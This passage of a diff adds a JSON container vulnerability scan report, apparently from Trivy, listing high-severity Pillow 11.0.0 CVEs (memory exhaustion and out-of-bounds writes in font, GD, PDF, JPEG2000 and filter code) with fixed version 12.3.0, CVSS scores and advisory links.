+            "https://github.com/python-pillow/Pillow/pull/9719",
+            "https://github.com/python-pillow/Pillow/releases/tag/12.3.0",
+            "https://github.com/python-pillow/Pillow/security/advisories/GHSA-62p4-gmf7-7g93",
+            "https://linux.oracle.com/cve/CVE-2026-54058.html",
+            "https://linux.oracle.com/errata/ELSA-2026-48021.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-54058",
+            "https://www.cve.org/CVERecord?id=CVE-2026-54058"
+          ],
+          "PublishedDate": "2026-07-14T17:17:03.433Z",
+          "LastModifiedDate": "2026-07-15T20:08:02.787Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-54059",
+          "VendorIDs": [
+            "GHSA-8v84-f9pq-wr9x"
+          ],
+          "PkgName": "pillow",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/pillow-11.0.0.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pillow@11.0.0",
+            "UID": "82439caa63e80e4f"
+          },
+          "InstalledVersion": "11.0.0",
+          "FixedVersion": "12.3.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:a41cba4fd18058aa3c4480f22640f94405996919aa074fa06a4df33cfdb699aa",
+            "DiffID": "sha256:7b4e304a6dd4de67613efa1bc58887ed01d04e4b0d5c5d3b03adbb55ccc8c158"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-54059",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:137007df118ee9fe7355265482d3032748fef77e4d3a6463e293c5db97829dda",
+          "Title": "python-pillow: Pillow: Denial of Service via crafted PCF font data",
+          "Description": "Pillow is a Python imaging library. Prior to 12.3.0, PIL/PcfFontFile.py _load_bitmaps() read glyph dimensions from the PCF METRICS section and passed them directly to Image.frombytes() without calling Image._decompression_bomb_check(), allowing crafted PCF font data to cause excessive memory allocation. This issue is fixed in version 12.3.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-789"
+          ],
+          "VendorSeverity": {
+            "alma": 3,
+            "amazon": 3,
+            "bitnami": 3,
+            "ghsa": 3,
+            "oracle-oval": 3,
+            "redhat": 3,
+            "rocky": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:39127",
+            "https://access.redhat.com/security/cve/CVE-2026-54059",
+            "https://bugzilla.redhat.com/2497452",
+            "https://bugzilla.redhat.com/2497455",
+            "https://bugzilla.redhat.com/2497464",
+            "https://bugzilla.redhat.com/2497466",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497452",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497455",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497464",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497466",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54059",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54060",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-55379",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-55380",
+            "https://errata.almalinux.org/8/ALSA-2026-39127.html",
+            "https://errata.rockylinux.org/RLSA-2026:39127",
+            "https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2253.yaml",
+            "https://github.com/python-pillow/Pillow",
+            "https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst",
+            "https://github.com/python-pillow/Pillow/commit/0a263e6264aa5399988d9acd3bbfbca2ca3ec77d",
+            "https://github.com/python-pillow/Pillow/security/advisories/GHSA-8v84-f9pq-wr9x",
+            "https://linux.oracle.com/cve/CVE-2026-54059.html",
+            "https://linux.oracle.com/errata/ELSA-2026-39127.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-54059",
+            "https://www.cve.org/CVERecord?id=CVE-2026-54059"
+          ],
+          "PublishedDate": "2026-07-06T19:17:08.127Z",
+          "LastModifiedDate": "2026-07-07T18:58:26.73Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-54060",
+          "VendorIDs": [
+            "GHSA-5x94-69rx-g8h2"
+          ],
+          "PkgName": "pillow",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/pillow-11.0.0.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pillow@11.0.0",
+            "UID": "82439caa63e80e4f"
+          },
+          "InstalledVersion": "11.0.0",
+          "FixedVersion": "12.3.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:a41cba4fd18058aa3c4480f22640f94405996919aa074fa06a4df33cfdb699aa",
+            "DiffID": "sha256:7b4e304a6dd4de67613efa1bc58887ed01d04e4b0d5c5d3b03adbb55ccc8c158"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-54060",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:21446f3a91651e0bb65b77a97128e2a3a6ef2b29a745dfb0b257d8dd1a0ef065",
+          "Title": "python-pillow: Pillow: Denial of Service via excessive memory allocation when processing font files",
+          "Description": "Pillow is a Python imaging library. Prior to 12.3.0, PIL/FontFile.py FontFile.compile() assembled per-glyph images into a combined bitmap with Image.new(\"1\", (xsize, ysize)) without calling Image._decompression_bomb_check(), allowing a font to trigger excessive allocation during conversion or saving. This issue is fixed in version 12.3.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-789"
+          ],
+          "VendorSeverity": {
+            "alma": 3,
+            "amazon": 3,
+            "bitnami": 3,
+            "ghsa": 3,
+            "oracle-oval": 3,
+            "redhat": 3,
+            "rocky": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:39127",
+            "https://access.redhat.com/security/cve/CVE-2026-54060",
+            "https://bugzilla.redhat.com/2497452",
+            "https://bugzilla.redhat.com/2497455",
+            "https://bugzilla.redhat.com/2497464",
+            "https://bugzilla.redhat.com/2497466",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497452",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497455",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497464",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497466",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54059",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54060",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-55379",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-55380",
+            "https://errata.almalinux.org/8/ALSA-2026-39127.html",
+            "https://errata.rockylinux.org/RLSA-2026:39127",
+            "https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2254.yaml",
+            "https://github.com/python-pillow/Pillow",
+            "https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst",
+            "https://github.com/python-pillow/Pillow/commit/0a263e6264aa5399988d9acd3bbfbca2ca3ec77d",
+            "https://github.com/python-pillow/Pillow/security/advisories/GHSA-5x94-69rx-g8h2",
+            "https://linux.oracle.com/cve/CVE-2026-54060.html",
+            "https://linux.oracle.com/errata/ELSA-2026-39127.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-54060",
+            "https://www.cve.org/CVERecord?id=CVE-2026-54060"
+          ],
+          "PublishedDate": "2026-07-06T19:17:08.27Z",
+          "LastModifiedDate": "2026-07-07T18:58:45.827Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-55379",
+          "VendorIDs": [
+            "GHSA-45hq-cxwh-f6vc"
+          ],
+          "PkgName": "pillow",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/pillow-11.0.0.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pillow@11.0.0",
+            "UID": "82439caa63e80e4f"
+          },
+          "InstalledVersion": "11.0.0",
+          "FixedVersion": "12.3.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:a41cba4fd18058aa3c4480f22640f94405996919aa074fa06a4df33cfdb699aa",
+            "DiffID": "sha256:7b4e304a6dd4de67613efa1bc58887ed01d04e4b0d5c5d3b03adbb55ccc8c158"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-55379",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:28ada995f1b5c41d8be195f77d9932fb123156c8c353b23050817b2db9c167ee",
+          "Title": "python-pillow: Pillow: Denial of Service via crafted BDF font file",
+          "Description": "Pillow is a Python imaging library. Prior to 12.3.0, PIL/BdfFontFile.py bdf_char() read the BBX width and height field from a BDF font file and passed attacker-controlled dimensions to Image.new() without calling Image._decompression_bomb_check(), bypassing Pillow's documented decompression bomb protection and allowing excessive memory allocation. This issue is fixed in version 12.3.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-789"
+          ],
+          "VendorSeverity": {
+            "alma": 3,
+            "amazon": 3,
+            "bitnami": 3,
+            "ghsa": 3,
+            "oracle-oval": 3,
+            "redhat": 3,
+            "rocky": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:39127",
+            "https://access.redhat.com/security/cve/CVE-2026-55379",
+            "https://bugzilla.redhat.com/2497452",
+            "https://bugzilla.redhat.com/2497455",
+            "https://bugzilla.redhat.com/2497464",
+            "https://bugzilla.redhat.com/2497466",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497452",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497455",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497464",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497466",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54059",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54060",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-55379",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-55380",
+            "https://errata.almalinux.org/8/ALSA-2026-39127.html",
+            "https://errata.rockylinux.org/RLSA-2026:39127",
+            "https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2255.yaml",
+            "https://github.com/python-pillow/Pillow",
+            "https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst",
+            "https://github.com/python-pillow/Pillow/commit/0a263e6264aa5399988d9acd3bbfbca2ca3ec77d",
+            "https://github.com/python-pillow/Pillow/security/advisories/GHSA-45hq-cxwh-f6vc",
+            "https://linux.oracle.com/cve/CVE-2026-55379.html",
+            "https://linux.oracle.com/errata/ELSA-2026-39127.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-55379",
+            "https://www.cve.org/CVERecord?id=CVE-2026-55379"
+          ],
+          "PublishedDate": "2026-07-06T19:17:08.577Z",
+          "LastModifiedDate": "2026-07-07T18:59:01.817Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-55380",
+          "VendorIDs": [
+            "GHSA-phj9-mv4w-65pm"
+          ],
+          "PkgName": "pillow",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/pillow-11.0.0.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pillow@11.0.0",
+            "UID": "82439caa63e80e4f"
+          },
+          "InstalledVersion": "11.0.0",
+          "FixedVersion": "12.3.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:a41cba4fd18058aa3c4480f22640f94405996919aa074fa06a4df33cfdb699aa",
+            "DiffID": "sha256:7b4e304a6dd4de67613efa1bc58887ed01d04e4b0d5c5d3b03adbb55ccc8c158"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-55380",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:5de3cdf8302503a124dad588594e9e34f529ff7151f5ec73ec1c8e65fa37d357",
+          "Title": "python-pillow: Pillow: Denial of Service via crafted GD 2.x image file",
+          "Description": "Pillow is a Python imaging library. Prior to 12.3.0, PIL/GdImageFile.py GdImageFile._open() read image dimensions from the GD 2.x header and stored them in self._size without calling Image._decompression_bomb_check(), allowing a crafted .gd file to trigger excessive C-heap allocation when loaded. This issue is fixed in version 12.3.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-789"
+          ],
+          "VendorSeverity": {
+            "alma": 3,
+            "amazon": 3,
+            "bitnami": 3,
+            "ghsa": 3,
+            "oracle-oval": 3,
+            "redhat": 3,
+            "rocky": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/errata/RHSA-2026:39127",
+            "https://access.redhat.com/security/cve/CVE-2026-55380",
+            "https://bugzilla.redhat.com/2497452",
+            "https://bugzilla.redhat.com/2497455",
+            "https://bugzilla.redhat.com/2497464",
+            "https://bugzilla.redhat.com/2497466",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497452",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497455",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497464",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2497466",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54059",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-54060",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-55379",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-55380",
+            "https://errata.almalinux.org/8/ALSA-2026-39127.html",
+            "https://errata.rockylinux.org/RLSA-2026:39127",
+            "https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2256.yaml",
+            "https://github.com/python-pillow/Pillow",
+            "https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst",
+            "https://github.com/python-pillow/Pillow/commit/f39b0ae6624eb2d7c5c5d651d9bb5fdbd96a8675",
+            "https://github.com/python-pillow/Pillow/security/advisories/GHSA-phj9-mv4w-65pm",
+            "https://linux.oracle.com/cve/CVE-2026-55380.html",
+            "https://linux.oracle.com/errata/ELSA-2026-39127.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-55380",
+            "https://www.cve.org/CVERecord?id=CVE-2026-55380"
+          ],
+          "PublishedDate": "2026-07-06T19:17:08.703Z",
+          "LastModifiedDate": "2026-07-07T18:58:54.647Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-59197",
+          "VendorIDs": [
+            "GHSA-xj96-63gp-2gmr"
+          ],
+          "PkgName": "pillow",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/pillow-11.0.0.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pillow@11.0.0",
+            "UID": "82439caa63e80e4f"
+          },
+          "InstalledVersion": "11.0.0",
+          "FixedVersion": "12.3.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:a41cba4fd18058aa3c4480f22640f94405996919aa074fa06a4df33cfdb699aa",
+            "DiffID": "sha256:7b4e304a6dd4de67613efa1bc58887ed01d04e4b0d5c5d3b03adbb55ccc8c158"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-59197",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:d07c7da1cc293e523d993d7c197ed543b8710cba8eaaa9ff24c14dfc4d241e40",
+          "Title": "Pillow: Pillow: Native heap out-of-bounds write",
+          "Description": "Pillow is a Python imaging library. Prior to 12.3.0, Pillow's public rank-filter API can trigger a native heap out-of-bounds write when given a very large odd filter size because ImageFilter.RankFilter.filter() calls image.expand(size // 2, size // 2) before rank-filter size validation and ImagingExpand() computes output dimensions with unchecked signed int arithmetic. This issue is fixed in version 12.3.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-190",
+            "CWE-787"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3,
+            "oracle-oval": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H",
+              "V3Score": 8.2
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H",
+              "V3Score": 8.2
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H",
+              "V3Score": 8.2
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-59197",
+            "https://github.com/python-pillow/Pillow",
+            "https://github.com/python-pillow/Pillow/commit/cce3bdb867c77a3420261ed1bfdb6b0787ec8fc1",
+            "https://github.com/python-pillow/Pillow/pull/9695",
+            "https://github.com/python-pillow/Pillow/releases/tag/12.3.0",
+            "https://github.com/python-pillow/Pillow/security/advisories/GHSA-xj96-63gp-2gmr",
+            "https://linux.oracle.com/cve/CVE-2026-59197.html",
+            "https://linux.oracle.com/errata/ELSA-2026-48021.html",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59197",
+            "https://www.cve.org/CVERecord?id=CVE-2026-59197"
+          ],
+          "PublishedDate": "2026-07-14T17:17:14.487Z",
+          "LastModifiedDate": "2026-07-21T19:17:11.907Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-59199",
+          "VendorIDs": [
+            "GHSA-6r8x-57c9-28j4"
+          ],
+          "PkgName": "pillow",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/pillow-11.0.0.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pillow@11.0.0",
+            "UID": "82439caa63e80e4f"
+          },
+          "InstalledVersion": "11.0.0",
+          "FixedVersion": "12.3.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:a41cba4fd18058aa3c4480f22640f94405996919aa074fa06a4df33cfdb699aa",
+            "DiffID": "sha256:7b4e304a6dd4de67613efa1bc58887ed01d04e4b0d5c5d3b03adbb55ccc8c158"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-59199",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:e2f9423cf3e1e75bbd70cfad429f440066259369cd75a933ae9c36420562319c",
+          "Title": "Pillow: Pillow: Denial of Service via out-of-bounds write in image processing",
+          "Description": "Pillow is a Python imaging library. Prior to 12.3.0, Pillow public image coordinate APIs can trigger a native heap out-of-bounds write when given coordinates near the signed 32-bit integer limits in Image.paste(), Image.crop(), or Image.alpha_composite(). This issue is fixed in version 12.3.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-190",
+            "CWE-787"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-59199",
+            "https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-3451.yaml",
+            "https://github.com/python-pillow/Pillow",
+            "https://github.com/python-pillow/Pillow/commit/ceefc348eb3c3844c7f9796ef2cc3a7dd5fbba7b",
+            "https://github.com/python-pillow/Pillow/pull/9703",
+            "https://github.com/python-pillow/Pillow/releases/tag/12.3.0",
+            "https://github.com/python-pillow/Pillow/security/advisories/GHSA-6r8x-57c9-28j4",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59199",
+            "https://www.cve.org/CVERecord?id=CVE-2026-59199"
+          ],
+          "PublishedDate": "2026-07-14T16:17:01.937Z",
+          "LastModifiedDate": "2026-07-15T16:16:49.487Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-59200",
+          "VendorIDs": [
+            "GHSA-jjj6-mw9f-p565"
+          ],
+          "PkgName": "pillow",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/pillow-11.0.0.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pillow@11.0.0",
+            "UID": "82439caa63e80e4f"
+          },
+          "InstalledVersion": "11.0.0",
+          "FixedVersion": "12.3.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:a41cba4fd18058aa3c4480f22640f94405996919aa074fa06a4df33cfdb699aa",
+            "DiffID": "sha256:7b4e304a6dd4de67613efa1bc58887ed01d04e4b0d5c5d3b03adbb55ccc8c158"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-59200",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:05e0ff2c5fba7794960edc248b57e9070d4136b5ab7d6acc881d4b35716ac7b6",
+          "Title": "Pillow: Pillow: Denial of service via crafted PDF stream",
+          "Description": "Pillow is a Python imaging library. From 5.1.0 until 12.3.0, PdfParser.PdfStream.decode() in PIL/PdfParser.py calls zlib.decompress() with bufsize set to the PDF stream Length field without bounding the decompressed output size, allowing a crafted FlateDecode PDF stream to exhaust memory from a small file. This issue is fixed in version 12.3.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-400",
+            "CWE-770"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-59200",
+            "https://github.com/python-pillow/Pillow",
+            "https://github.com/python-pillow/Pillow/commit/f7a31ea75e460e108c37126da1f47812f21f6b09",
+            "https://github.com/python-pillow/Pillow/pull/9718",
+            "https://github.com/python-pillow/Pillow/releases/tag/12.3.0",
+            "https://github.com/python-pillow/Pillow/security/advisories/GHSA-jjj6-mw9f-p565",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59200",
+            "https://www.cve.org/CVERecord?id=CVE-2026-59200"
+          ],
+          "PublishedDate": "2026-07-14T17:17:14.62Z",
+          "LastModifiedDate": "2026-07-21T15:52:40.107Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-59204",
+          "VendorIDs": [
+            "GHSA-vjc4-5qp5-m44j"
+          ],
+          "PkgName": "pillow",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/pillow-11.0.0.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pillow@11.0.0",
+            "UID": "82439caa63e80e4f"
+          },
+          "InstalledVersion": "11.0.0",
+          "FixedVersion": "12.3.0",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:a41cba4fd18058aa3c4480f22640f94405996919aa074fa06a4df33cfdb699aa",
+            "DiffID": "sha256:7b4e304a6dd4de67613efa1bc58887ed01d04e4b0d5c5d3b03adbb55ccc8c158"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-59204",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory pip",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"
+          },
+          "Fingerprint": "sha256:2298dc4897b3a5dd5bd27c610ec1c4e3d0134dc15ffdbb120c7b45c40b865962",
+          "Title": "Pillow: Pillow: Denial of Service via crafted JPEG2000 image",
+          "Description": "Pillow is a Python imaging library. From 8.2.0 through 12.2.0, src/libImaging/Jpeg2KDecode.c accumulates total_component_width across every tile in a JPEG2000 image instead of recomputing it per tile, allowing a crafted tiled JPEG2000 file to force substantially higher transient memory usage and trigger out-of-memory failures during decoding. This issue is fixed in version 12.3.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-789",
+            "CWE-770"
+          ],
+          "VendorSeverity": {
+            "bitnami": 3,
+            "ghsa": 3,
+            "nvd": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "bitnami": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.7
+            },
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V40Score": 8.7
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-59204",
+            "https://github.com/python-pillow/Pillow",
+            "https://github.com/python-pillow/Pillow/commit/13ada41172142f2fd9f0906f615a00ea623a11ca",
+            "https://github.com/python-pillow/Pillow/pull/9704",
+            "https://github.com/python-pillow/Pillow/releases/tag/12.3.0",
+            "https://github.com/python-pillow/Pillow/security/advisories/GHSA-vjc4-5qp5-m44j",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59204",
+            "https://www.cve.org/CVERecord?id=CVE-2026-59204"
+          ],
+          "PublishedDate": "2026-07-14T16:17:02.227Z",
+          "LastModifiedDate": "2026-07-21T19:17:12.02Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-59205",
+          "VendorIDs": [
+            "GHSA-9hw9-ch79-4vh6"
+          ],
+          "PkgName": "pillow",
+          "PkgPath": "usr/local/lib/python3.10/site-packages/pillow-11.0.0.dist-info/METADATA",
+          "PkgIdentifier": {
+            "PURL": "pkg:pypi/pillow@11.0.0",
+            "UID": "82439caa63e80e4f"
+          },
+          "InstalledVersion": "11.0.0",
+          "FixedVersion": "12.3.0",
+          "Status": "fixed",
+          "Layer": {
